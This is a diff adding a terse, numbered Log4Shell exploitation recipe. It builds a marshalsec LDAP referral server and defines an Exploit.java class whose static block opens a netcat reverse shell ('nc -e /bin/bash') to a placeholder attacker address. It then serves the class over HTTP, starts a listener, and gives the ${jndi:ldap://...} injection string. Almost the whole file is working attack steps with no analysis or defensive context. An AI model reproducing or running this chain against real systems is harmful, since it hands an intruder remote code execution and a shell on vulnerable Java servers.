@@ -1,0 +1,18 @@
+1)cd /path/to/marshalsec
+2)mvn clean package -DskipTests
+3)java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
+
+4)nano Exploit.java = 
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+5)javac Exploit.java -source 8 -target 8
+6)python3 -m http.server
+7)nc -lnvp 9999
+8)${jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit}
